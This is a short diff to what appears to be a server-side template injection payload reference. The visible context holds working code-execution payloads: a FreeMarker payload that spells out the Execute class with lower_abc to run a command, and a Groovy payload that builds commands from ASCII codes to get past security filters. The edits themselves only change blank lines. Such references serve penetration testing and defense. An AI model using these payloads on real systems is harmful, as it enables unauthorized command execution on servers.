@@ -118,8 +118,8 @@ FreeMarker offers the built-in function: `lower_abc`. This function converts int
 
 If you wanted a string that represents the string: "id", you could use the payload: `${9?lower_abc+4?lower_abc)}`.
 
-
 Chaining `lower_abc` to perform code execution (command: `id`):
+
 ```js
 ${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
 ```
@@ -316,6 +316,7 @@ You can bypass security filters by constructing strings from ASCII codes and exe
 Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.
 
 Execute system command (command: `id`):
+
 ```groovy
 ${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
 ```
